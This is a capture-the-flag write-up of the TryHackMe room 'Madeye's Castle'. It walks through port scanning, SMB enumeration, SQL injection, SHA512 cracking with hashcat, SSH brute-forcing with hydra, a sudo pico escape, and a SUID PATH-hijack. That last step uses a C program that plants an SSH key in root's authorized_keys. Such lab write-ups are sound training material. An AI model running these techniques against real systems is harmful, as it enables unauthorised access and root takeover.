---
title: "Madeye's Castle TryHackMe Writeup"
last_modified_at: 2021-02-04T11:40:02-05:00
categories:
  - thm
author_profile: false
tags:
  - thm
  - Linux
  - hydra
  - hashcat
  - suid
  - gtfobins
  - sudo
  - medium
  - madeyescastle
---

<img alt="madeyescastle" src="/assets/images/thm/madeyescastle/madeyescastle.jpeg" width="200px" height="50px">

<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="reddevil2020" data-description="Support me on Buy me a coffee!" data-message="Thank you for visiting. You can now buy me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>


[Madeye's Castle](https://tryhackme.com/room/madeyescastle) is a medium rated Linux room on tryhackme by [madeye](https://tryhackme.com/p/madeye). Using SQL injection on the webserver we obtain different SHA512 hashes for the users which was cracked using hashcat and the same password was used to login on the box as user Harry using SSH. On the box sudo entry was used to get a shell as another user hermonine and SUID binary was used to get root shell on the box.


# Port Scan
## Full Port Scan
```console
reddevil@ubuntu:~/Documents/tryhackme/madeyescastle$ nmap -p- --min-rate 10000 -v -oN nmap/all-ports 10.10.227.137
Nmap scan report for 10.10.227.137
Host is up (0.34s latency).
Not shown: 65531 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue Feb  2 17:43:58 2021 -- 1 IP address (1 host up) scanned in 104.27 seconds
```
We have four ports open.

## Detail Scan
```console
reddevil@ubuntu:~/Documents/tryhackme/madeyescastle$ nmap -p22,80,139,445 -sC -sV -oN nmap/detail 10.10.227.137
Nmap scan report for 10.10.227.137
Host is up (0.34s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:5f:48:fa:3d:3e:e6:9c:23:94:33:d1:8d:22:b4:7a (RSA)
|   256 53:75:a7:4a:a8:aa:46:66:6a:12:8c:cd:c2:6f:39:aa (ECDSA)
|_  256 7f:c2:2f:3d:64:d9:0a:50:74:60:36:03:98:00:75:98 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: Amazingly It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: HOGWARTZ-CASTLE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 0s, deviation: 1s, median: -1s
|_nbstat: NetBIOS name: HOGWARTZ-CASTLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: hogwartz-castle
|   NetBIOS computer name: HOGWARTZ-CASTLE\x00
|   Domain name: \x00
|   FQDN: hogwartz-castle
|_  System time: 2021-02-02T12:02:25+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-02T12:02:25
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb  2 17:48:06 2021 -- 1 IP address (1 host up) scanned in 57.91 seconds
```

Lets start our enumeration with SMB.

# SMB on Port 445
### Trying to list shares using smbclient
![1](/assets/images/thm/madeyescastle/1.png)

We are able to list the shares and we can see that there is a non standard share called `sambashare`. So, lets check if we have permission to access the share.

### Accessing share contents
![2](/assets/images/thm/madeyescastle/2.png)
We are able to list the contents. Lets download those two files to our local box.

```console
smb: \> get spellnames.txt
getting file \spellnames.txt of size 874 as spellnames.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \> get .notes.txt
getting file \.notes.txt of size 147 as .notes.txt (0.1 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```
### Content of spellnames.txt
```console
avadakedavra
crucio
imperio
morsmordre
brackiumemendo
confringo
........
........*
anapneo
incendio
evanesco
aguamenti
```

### Content of .notes.txt
```console
Hagrid told me that spells names are not good since they will not "rock you"
Hermonine loves historical text editors along with reading old books.
```
There is something reference with rockyou.txt wordlist and we get two names ie **Hagrid** and **Hermonine** which might come handy later, so lets keep a note of that.

Since there was not much on the SMB server, let us check the web server on Port 80.

# HTTP service on Port 80
![3](/assets/images/thm/madeyescastle/3.png)
We get a standard apache default page.

## Checking Source Code of the page
![4](/assets/images/thm/madeyescastle/4.png)

We get a new hostname. Lets add this entry to our /etc/hosts file.
```console
10.10.162.214   hogwartz-castle.thm
```

## Visting hogwartz-castle.thm
![5](/assets/images/thm/madeyescastle/5.png)
We get a login page. So at first I tried to login with common creds like `admin:admin`, `admin:password`, `hermonine:hermonine` and so on, but couldnot find anything.

## Trying SQL injection
![6](/assets/images/thm/madeyescastle/6.png)
And we get a error message saying password for Lucas Washington is incorrect which proves that this is vulnerable to SQL injection.

So, I copied the response to a file and ran with SQLMap. While the SQLMap was running, I manually poked at this vulnerability.

### Determing the columns
![7](/assets/images/thm/madeyescastle/7.png)
The query was returning 4 columns and column number 1 and 4 are reflected on the response. So, I tried to manually enumerate the databases and table names but was unsuccessful. I tried many payloads to indentify which SQL was running on the backend but couldnot figure it out. After a while SQLMap said the webserver was vulnerable to SQL injection and the backend was using sqlite.

### SQLMap
![8](/assets/images/thm/madeyescastle/8.png)
Now that I know the backend is using SQLite, I tried to enumerate the tables manually and extract the contents as the SQLmap is going to take a lot of time doing so with blind injection method.

### Listing the Tables
![9](/assets/images/thm/madeyescastle/9.png)
We get a table name **user**.

### Listing the column names
![10](/assets/images/thm/madeyescastle/10.png)
We get name of 4 columns. ie **name**,**admin**,**password**,**notes**.

## Extracting the column values
### Notes
![11](/assets/images/thm/madeyescastle/11.png)

### Name and Password
![12](/assets/images/thm/madeyescastle/12.png)

Since the message says to try the best64 rule on hashcat. Lets try to crack this hash using rockyou.txt and base64 hashcat rule.

## Hash Cracking with Hashcat
### Content of hash.txt
```console
reddevil@ubuntu:~/Documents/tryhackme/madeyescastle$ cat hash.txt                                                                      
c53d7af1bbe101a6b45a3844c89c8c06d8ac24ed562f01b848cad9925c691e6f10217b6594532b9cd31aa5762d85df642530152d9adb3005fac407e2896bf492
b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885
e1ed732e4aa925f0bf125ae8ed17dd2d5a1487f9ff97df63523aa481072b0b5ab7e85713c07e37d9f0c6f8b1840390fc713a4350943e7409a8541f15466d8b54
.....................
.....................
36e2de7756026a8fc9989ac7b23cc6f3996595598c9696cca772f31a065830511ac3699bdfa1355419e07fd7889a32bf5cf72d6b73c571aac60a6287d0ab8c36
8f45b6396c0d993a8edc2c71c004a91404adc8e226d0ccf600bf2c78d33ca60ef5439ccbb9178da5f9f0cfd66f8404e7ccacbf9bdf32db5dae5dde2933ca60e6
```
I searched around and found that the hash is SHA512 and the mode of SHA512 for hashcat is 1700.

### Hash Cracking
![13](/assets/images/thm/madeyescastle/13.png)
And a hash is successfully cracked. As the note said the linux username is the first name, so lets try to bruteforce the SSH password using hydra.

## Bruteforcing SSH using hydra
I copied all the names of the users on a file called names.txt and use the same wordlist for hydra.
### Contents of names.txt
```console
reddevil@ubuntu:~/Documents/tryhackme/madeyescastle$ cat names.txt 
lucas
harry
andrea
liam  
....
....
claire
brody
kimberly
```

### Using Hydra to bruteforce the password
![14](/assets/images/thm/madeyescastle/14.png)
And we get a hit. So, lets login on the box using SSH.

## Shell as Harry
![15](/assets/images/thm/madeyescastle/15.png)

# Privilege Escalation
### Sudo -l
![16](/assets/images/thm/madeyescastle/16.png)

Our user can run /usr/bin/pico as user hermonine. Lets check on [gtfobins](https://gtfobins.github.io/) if we can use this to get a shell on the box as user hermonine.
![17](/assets/images/thm/madeyescastle/17.png)
And it turns out we can execute commands as hermonine.

## Shell as hermoine
```console
harry@hogwartz-castle:~$ sudo -u hermonine /usr/bin/pico
```
![18](/assets/images/thm/madeyescastle/18.png)

We have a shell as user hermonine. This shell will be hard to work with, so lets generate a SSH key pairs and copy the public key to hermonine's authorized_keys file.

### Generating SSH key pairs
![19](/assets/images/thm/madeyescastle/19.png)

### Copying the content of hermonine.pub to authorized_keys
![20](/assets/images/thm/madeyescastle/20.png)

### Shell as hermonine using SSH
![21](/assets/images/thm/madeyescastle/21.png)

### Checking for SUID binaries
![22](/assets/images/thm/madeyescastle/22.png)

We get a non standard binary with SUID bit set. If we can find any vulnerabilities on this binary we will be able to execute commands as root. So, I downloaded the binary and reversed using ghidra.

## Downloading the file to local box
```console
reddevil@ubuntu:~/Documents/tryhackme/madeyescastle$ scp -i hermonine hermonine@hogwartz-castle.thm:/srv/time-turner/swagger swagger
```

## Reversing with ghidra
### Main function
```c
undefined8 main(void)

{
  time_t tVar1;
  long in_FS_OFFSET;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  tVar1 = time((time_t *)0x0);
  srand((uint)tVar1);
  local_14 = rand();
  printf("Guess my number: ");
  __isoc99_scanf(&DAT_00100b8d,&local_18);
  if (local_14 == local_18) {
    impressive();
  }
  else {
    puts("Nope, that is not what I was thinking");
    printf("I was thinking of %d\n",(ulong)local_14);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
The program generates a random number with seed as time(0) and we have to guess that number. If the number is correct, impressive() function will be called, and if the number is not correct the program teminates displaying error message.

### Definition of impressive() 

```c
void impressive(void)

{
  setregid(0,0);
  setreuid(0,0);
  puts("Nice use of the time-turner!");
  printf("This system architecture is ");
  fflush(stdout);
  system("uname -p");
  return;
}

```
This function sets the permissions as root and execute the program `uname -p`. Since the relative path is being used to call the uname binary, our system will look for this file on our PATH variable. If we update the PATH variable, we can execute a new uname binary with mallicious content. Now, we have to guess the number correctly.

## Bypassing the number check
## Running binary with ltrace
![23](/assets/images/thm/madeyescastle/23.png)
Here we can view the random number and we can submit after converting hex to decimal.
![24](/assets/images/thm/madeyescastle/24.png)
But it looked like ltrace drops the SUID permission and I couldnot get the command execution as root.

### Using own random number generator in C
![25](/assets/images/thm/madeyescastle/25.png)

```bash
hermonine@hogwartz-castle:/srv/time-turner$ gcc rand.c -o rand
hermonine@hogwartz-castle:/srv/time-turner$ ./rand | ./swagger 
Guess my number: Nice use of the time-turner!
This system architecture is x86_64
```
And the check is complete.

### Using Bash
```console
hermonine@hogwartz-castle:/srv/time-turner$ echo 0 | ./swagger | tail -1 | awk -F' ' '{print $5}' | ./swagger 
Guess my number: Nice use of the time-turner!
This system architecture is x86_64
```
Now we have to create a binary called uname, put it on our current directory and update our PATH variable.

### Content of uname.c
```c
#include <stdio.h>

main() {
   FILE *fp;

   fp = fopen("/root/.ssh/authorized_keys", "w+");
   fprintf(fp, "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0C1lOCfqJP7wT/rTzozKM5PhreHNpixuuaT5O2bfkXM75u1K6jE7VddpDp8/a5OeRlIofzfbcRujDTZ6gVW7TbdjGTy58SaJ1dq+e90FOGceI5tPUcIaREPJF590YjOhYDudSGlAik4RsbCQ+Xc4vVJSyw0RK6aKYrjAwqKa62RwwOY93QIjSjkeJoyyeGzye+pRB282zdJj0yWy2tQEsHxEyDdjbJAE5qzZjE+qEzYYQIKj7qyp4u9NzyVS/Urty/sZrLD5FLHqISIQpi0Xkva7cx1OxaxvYOKTAWue4dpsUv2lVQT1PtomBgi6WC7B/78Rq1dKBDfx/YDDxiK2SOFzQYLmK8enKkvRIvq2a7NEIgO7A0E7+husp/6A/8LZo5f7LwzyUG1QLufdPdGM2HRw4HW2bKoVSLkBPw2FDIJ4lkkVxqZNwDbg5h5LK7pco3DRYRU1U3kqE4IMaqMBeXxESqabIjecYIlRBbVrYiAr501ssSGKQVkyxKXFnmAE=");
   fclose(fp);
}
```
Here I have written our public key to root's ssh directory.

### Updating the path
```console
hermonine@hogwartz-castle:/srv/time-turner$ export PATH=`pwd`:$PATH
```
### Compiling uname.c
```console
hermonine@hogwartz-castle:/srv/time-turner$ gcc uname.c -o uname
uname.c:3:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
 main() {
 ^~~~
hermonine@hogwartz-
```
It gives us a warning but the code is successfully compiled.

### Running the exploit
![26](/assets/images/thm/madeyescastle/26.png)

Looks like it ran. Let us try to login to the box as root using SSH.

### Shell as root
![27](/assets/images/thm/madeyescastle/27.png)
And we successfully login as root on the box.

